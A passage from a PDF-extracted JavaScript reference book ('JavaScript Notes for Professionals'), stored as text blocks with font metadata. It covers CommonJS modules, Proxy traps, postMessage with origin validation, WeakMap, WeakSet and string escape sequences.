        "text": "CommonJS is a popular modularization pattern that's used in Node.js. The CommonJS system is centered around a  require ()  function that loads other modules and an  exports  property that lets modules export publicly accessible methods. Here's an example of CommonJS, we'll load Lodash and Node.js'  fs  module:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Load fs and lodash, we can use them anywhere inside the module",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  fs  =  require ( \"fs\" ),     _  =  require ( \"lodash\" ); var  myPrivateFn  =   function ( param )   {      return   \"Here's what you said: \"   +  param ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 373",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Here we export a public `myMethod` that other modules can use",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "exports. myMethod   =   function ( param )   {      return  myPrivateFn ( param ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also export a function as the entire module using  module. exports :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "module. exports   =   function ()   {      return   \"Hello!\" ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 374",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 74: Proxy",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "target The target object, actions on this object (getting, setting, etc...) will be routed through the handler handler An object that can de\ufb01ne \"traps\" for intercepting actions on the target object (getting, setting, etc...) A Proxy in JavaScript can be used to modify fundamental operations on objects. Proxies were introduced in ES6. A Proxy on an object is itself an object, that has  traps . Traps may be triggered when operations are performed on the Proxy. This includes property lookup, function calling, modifying properties, adding properties, et cetera. When no applicable trap is de\ufb01ned, the operation is performed on the proxied object as if there was no Proxy.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 74.1: Proxying property lookup",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To in\ufb02uence property lookup, the  get  handler must be used. In this example, we modify property lookup so that not only the value, but also the type of that value is returned. We use  Re\ufb02ect  to ease this.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  handler  =   {      get ( target ,  property )   {          if   (! Reflect. has ( target ,  property ))   {              return   {                 value :   undefined ,                 type :   'undefined'              };          }          let  value  =  Reflect. get ( target ,  property );          return   {             value :  value ,             type :   typeof  value          };      } }; let  proxied  =   new  Proxy ({ foo :   'bar' },  handler );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( proxied. foo );   // logs `Object {value: \"bar\", type: \"string\"}`",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 74.2: Very simple proxy (using the set trap)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This proxy simply appends the string  \" went through proxy\"  to every string property set on the target  object .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  object   =   {}; let  handler  =   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     set ( target ,  prop ,  value ){   // Note that ES6 object syntax is used",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if ( 'string'   ===   typeof  value ){             target [ prop ]   =  value  +   \" went through proxy\" ;          }      } }; let  proxied  =   new  Proxy ( object ,  handler ); proxied. example   =   \"ExampleValue\" ; console. log ( object );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// logs: { example: \"ExampleValue went through proxy\" }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 375",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// you could also access the object via proxied.target",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 376",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 75: .postMessage() and MessageEvent",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameters   message   targetOrigin   ",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "transfer",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "optional",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 75.1: Getting Started",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "What is  .postMessage() , when and why do we use it . postMessage ()  method is a way to safely allow communication between cross-origin scripts.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Normally, two di\ufb00erent pages, can only directly communicate with each other using JavaScript when they are under the same origin, even if one of them is embedded into another (e.g.  iframes ) or one is opened from inside the other (e.g.  window. open () ). With  . postMessage () , you can work around this restriction while still staying safe.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You can only use  . postMessage ()  when you have access to both pages' JavaScript code.  Since the receiver",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "needs to validate the sender and process the message accordingly, you can only use this method to communicate between two scripts you have access to. We will build an example to send messages to a child window and have the messages be displayed on the child window. The parent/sender page will be assumed to be  http : //sender.com  and child/receiver page will be assumed to be  http : //receiver.com  for the example.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Sending messages",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In order to send messages to another window, you need to have a reference to its  window  object.  window. open () returns the reference object of the newly opened window. For other methods to obtain a reference to a window object, see the explanation under  otherWindow  parameter  here .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  childWindow  =  window. open ( \"http://receiver.com\" ,   \"_blank\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Add a  textarea  and a  send button  that will be used to send messages to child window.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<textarea   id = \"text\" ></textarea>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<button   id = \"btn\" > Send Message </button> Send the text of  textarea  using  . postMessage ( message ,  targetOrigin )  when the  button  is clicked. var  btn  =  document. getElementById ( \"btn\" ),     text  =  document. getElementById ( \"text\" ); btn. addEventListener ( \"click\" ,   function   ()   {     sendMessage ( text. value );     text. value   =   \"\" ; }); function  sendMessage ( message )   {      if   (! message  ||   ! message. length )   return ;     childWindow. postMessage ( JSON. stringify ({         message :  message ,         time :   new  Date ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 377",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     }),   'http://receiver.com' ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In order send and receive JSON objects instead of a simple string,  JSON. stringify ()  and  JSON. parse ()  methods can be used. A  Transfarable Object  can be given as the third optional parameter of the  . postMessage ( message , targetOrigin ,  transfer )  method, but browser support is still lacking even in modern browsers. For this example, since our receiver is assumed to be  http : //receiver.com  page, we enter its url as the targetOrigin . The value of this parameter should match the  origin  of the  childWindow  object for the message to be send. It is possible to use  *  as a  wildcard  but is  highly recommended  to avoid using the wildcard and always set this parameter to receiver's speci\ufb01c origin  for security reasons .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Receiving, Validating and Processing Messages",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The code under this part should be put in the receiver page, which is  http : //receiver.com  for our example. In order to receive messages, the  message event  of the  window  should be listened.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. addEventListener ( \"message\" ,  receiveMessage );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When a message is received there are a couple of  steps that should be followed to assure security as much as possible .",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Validate the sender Validate the message Process the message The sender should always be validated to make sure the message is received from a trusted sender. After that, the message itself should be validated to make sure nothing malicious is received. After these two validations, the message can be processed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  receiveMessage ( ev )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //Check event.origin to see if it is a trusted sender.      //If you have a reference to the sender, validate event.source      //We only want to receive messages from http://sender.com, our trusted sender page.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( ev. origin   !==   \"http://sender.com\"   ||  ev. source   !==  window. opener )          return ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //Validate the message      //We want to make sure it's a valid json object and it does not contain anything malicious",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  data ;      try   {         data  =  JSON. parse ( ev. data );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         //data.message = cleanseText(data.message)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }   catch   ( ex )   {          return ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //Do whatever you want with the received message      //We want to append the message into our #console div",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  p  =  document. createElement ( \"p\" );     p. innerText   =   ( new  Date ( data. time )) . toLocaleTimeString ()   +   \" | \"   +  data. message ;     document. getElementById ( \"console\" ) . appendChild ( p ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 378",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Click here for a JS Fiddle showcasing its usage.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 379",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 76: WeakMap",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 76.1: Creating a WeakMap object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "WeakMap object allows you to store key/value pairs. The di\ufb00erence from Map is that keys must be objects and are weakly referenced. This means that if there aren't any other strong references to the key, the element in WeakMap can be removed by garbage collector. WeakMap constructor has an optional parameter, which can be any iterable object (for example Array) containing key/value pairs as two-element arrays.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  o1  =   { a :   1 ,  b :   2 },       o2  =   {}; const  weakmap  =   new  WeakMap ([[ o1 ,   true ],   [ o2 ,  o1 ]]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 76.2: Getting a value associated to the key",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get a value associated to the key, use the  . get ()  method. If there's no value associated to the key, it returns",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefined .",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakmap  =   new  WeakMap ([[ obj1 ,   7 ]]); console. log ( weakmap. get ( obj1 ));   // 7 console. log ( weakmap. get ( obj2 ));   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 76.3: Assigning a value to the key",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To assign a value to the key, use the  . set ()  method. It returns the WeakMap object, so you can chain  . set ()  calls.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakmap  =   new  WeakMap (); weakmap. set ( obj1 ,   1 ) . set ( obj2 ,   2 ); console. log ( weakmap. get ( obj1 ));   // 1 console. log ( weakmap. get ( obj2 ));   // 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 76.4: Checking if an element with the key exists",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To check if an element with a speci\ufb01ed key exits in a WeakMap, use the  . has ()  method. It returns  true  if it exits, and otherwise  false .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakmap  =   new  WeakMap ([[ obj1 ,   7 ]]); console. log ( weakmap. has ( obj1 ));   // true console. log ( weakmap. has ( obj2 ));   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 380",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.5: Removing an element with the key",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To remove an element with a speci\ufb01ed key, use the  . delete ()  method. It returns  true  if the element existed and has been removed, otherwise  false .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakmap  =   new  WeakMap ([[ obj1 ,   7 ]]); console. log ( weakmap. delete ( obj1 ));   // true console. log ( weakmap. has ( obj1 ));   // false console. log ( weakmap. delete ( obj2 ));   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 76.6: Weak reference demo",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript uses  reference counting  technique to detect unused objects. When reference count to an object is zero, that object will be released by the garbage collector. Weakmap uses weak reference that does not contribute to reference count of an object, therefore it is very useful to solve memory  leak problems . Here is a demo of weakmap. I use a very large object as value to show that weak reference does not contribute to reference count.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// manually trigger garbage collection to make sure that we are in good status.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  global. gc ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// check initial memory use \uff0c heapUsed is 4M or so",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  process. memoryUsage (); {  rss :   21106688 ,   heapTotal :   7376896 ,   heapUsed :   4153936 ,   external :   9059   } >   let  wm  =   new  WeakMap ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">   const  b  =   new  Object ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  global. gc ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// heapUsed is still 4M or so",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  process. memoryUsage (); {  rss :   20537344 ,   heapTotal :   9474048 ,   heapUsed :   3967272 ,   external :   8993   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// add key-value tuple into WeakMap \uff0c // key is b \uff0c value is 5*1024*1024 array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  wm. set ( b ,   new  Array ( 5 * 1024 * 1024 )); WeakMap  {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// manually garbage collection",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  global. gc ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// heapUsed is still 45M",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 381",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": ">  process. memoryUsage (); {  rss :   62652416 ,   heapTotal :   51437568 ,   heapUsed :   45911664 ,   external :   8951   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// b reference to null",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  b  =   null ; null",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// garbage collection",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  global. gc ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// after remove b reference to object \uff0c heapUsed is 4M again // it means the big array in WeakMap is released // it also means weekmap does not contribute to big array's reference count, only b does.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ">  process. memoryUsage (); {  rss :   20639744 ,   heapTotal :   8425472 ,   heapUsed :   3979792 ,   external :   8956   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 382",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 77: WeakSet",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 77.1: Creating a WeakSet object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The WeakSet object is used for storing weakly held objects in a collection. The di\ufb00erence from Set is that you can't store primitive values, like numbers or string. Also, references to the objects in the collection are held weakly, which means that if there is no other reference to an object stored in a WeakSet, it can be garbage collected. The WeakSet constructor has an optional parameter, which can be any iterable object (for example an array). All of its elements will be added to the created WeakSet.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakset  =   new  WeakSet ([ obj1 ,  obj2 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 77.2: Adding a value",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To add a value to a WeakSet, use the  . add ()  method. This method is chainable.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakset  =   new  WeakSet (); weakset. add ( obj1 ) . add ( obj2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 77.3: Checking if a value exists",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To check if a value exits in a WeakSet, use the  . has ()  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakset  =   new  WeakSet ([ obj1 ]); console. log ( weakset. has ( obj1 ));   // true console. log ( weakset. has ( obj2 ));   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 77.4: Removing a value",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To remove a value from a WeakSet, use the  . delete ()  method. This method returns  true  if the value existed and has been removed, otherwise  false .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj1  =   {},       obj2  =   {}; const  weakset  =   new  WeakSet ([ obj1 ]); console. log ( weakset. delete ( obj1 ));   // true console. log ( weakset. delete ( obj2 ));   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 383",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 78: Escape Sequences",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 78.1: Entering special characters in strings and regular expressions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Most printable characters can be included in string or regular expression literals just as they are, e.g.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  str  =   \" \u30dd\u30b1\u30e2\u30f3 \" ;   // a valid string var  regExp  =   /[ \u0391 - \u03a9\u03b1 - \u03c9 ]/ ;   // matches any Greek letter without diacritics",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In order to add arbitrary characters to a string or regular expression, including non-printable ones, one has to use escape sequences . Escape sequences consist of a backslash (\"\\\\\") followed by one or more other characters. To write an escape sequence for a particular character, one typically (but not always) needs to know its hexadecimal character code. JavaScript provides a number of di\ufb00erent ways to specify escape sequences, as documented in the examples in this topic. For instance, the following escape sequences all denote the same character: the  line feed  (Unix newline character), with character code U+000A. \\\\n",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\\\\x0a \\\\u000a",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\\\\u { a }  new in ES6, only in strings \\\\012  forbidden in string literals in strict mode and in template strings \\\\cj  only in regular expressions",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 78.2: Escape sequence types",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Single character escape sequences",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Some escape sequences consist of a backslash followed by a single character. For example, in  alert ( \"Hello \\n World\" ); , the escape sequence  \\n  is used to introduce a newline in the string parameter, so that the words \"Hello\" and \"World\" are displayed in consecutive lines.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Escape sequence Character Unicode",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\\b  (only in strings, not in regular expressions) backspace U+0008 \\t horizontal tab U+0009 \\n line feed U+000A \\v vertical tab U+000B \\f form feed U+000C \\r carriage return U+000D Additionally, the sequence  \\0 , when not followed by a digit between 0 and 7, can be used to escape the null character (U+0000). The sequences  \\\\ ,  \\'  and  \\ \"  are used to escape the character that follows the backslash. While similar to non- escape sequences, where the leading backslash is simply ignored (i.e.  \\?  for  ? ), they are explicitly treated as single character escape sequences inside strings as per the speci\ufb01cation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hexadecimal escape sequences",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 384",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Characters with codes between 0 and 255 can be represented with an escape sequence where  \\x  is followed by the 2-digit hexadecimal character code. For example, the non-breaking space character has code 160 or A0 in base 16, and so it can be written as  \\xa0 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  str  =   \"ONE \\x a0LINE\" ;   // ONE and LINE with a non-breaking space between them",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For hex digits above 9, the letters  a  to  f  are used, in lowercase or uppercase without distinction.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  regExp1  =   /[\\x00-xff]/ ;   // matches any character between U+0000 and U+00FF var  regExp2  =   /[\\x00-xFF]/ ;   // same as above",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "4-digit Unicode escape sequences",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Characters with codes between 0 and 65535 (216 - 1) can be represented with an escape sequence where  \\u  is followed by the 4-digit hexadecimal character code. For example, the Unicode standard de\ufb01nes the right arrow character (\"?\") with the number 8594, or 2192 in hexadecimal format. So an escape sequence for it would be  \\u2192 . This produces the string \"A ? B\":",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  str  =   \"A  \\u 2192 B\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For hex digits above 9, the letters  a  to  f  are used, in lowercase or uppercase without distinction. Hexadecimal codes shorter than 4 digits must be left-padded with zeros:  \\u007A  for the small letter \"z\".",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Curly bracket Unicode escape sequences",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "ES6 extends Unicode support to the full code range from 0 to 0x10FFFF. In order to escape characters with code greater than 216 - 1, a new syntax for escape sequences was introduced:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\\u {???}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Where the code in curly braces is hexadecimal representation of the code point value, e.g.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( \"Look!  \\u {1f440}\" );   // Look! ????",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the example above, the code  1f440  is the hexadecimal representation of the character code of the Unicode Character  Eyes . Note that the code in curly braces may contain any number of hex digits, as long the value does not exceed 0x10FFFF. For hex digits above 9, the letters  a  to  f  are used, in lowercase or uppercase without distinction. Unicode escape sequences with curly braces only work inside strings, not inside regular expressions!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Octal escape sequences",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Octal escape sequences are deprecated as of ES5, but they are still supported inside regular expressions and in non-strict mode also inside non-template strings. An octal escape sequence consists of one, two or three octal digits, with value between 0 and 3778 = 255. For example, the capital letter \"E\" has character code 69, or 105 in base 8. So it can be represented with the escape sequence  \\ 105 :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 385",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "/ \\105scape / . test ( \"Fun with Escape Sequences\" );   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In strict mode, octal escape sequences are not allowed inside strings and will produce a syntax error. It is worth to note that  \\0 , unlike  \\00  or  \\000 , is  not  considered an octal escape sequence, and is thus still allowed inside strings (even template strings) in strict mode.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Control escape sequences",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Some escape sequences are only recognized inside regular expression literals (not in strings). These can be used to escape characters with codes between 1 and 26 (U+0001 \u2013 U+001A). They consist of a single letter A \u2013 Z (case makes no di\ufb00erence) preceded by  \\c . The alphabetic position of the letter after  \\c  determines the character code. For example, in the regular expression",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "` / \\cG / `",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The letter \"G\" (the 7th letter in the alphabet) refers to the character U+0007, and thus",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "` / \\cG` / . test ( String. fromCharCode ( 7 ));   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 386",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 79: Behavioral Design Patterns",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
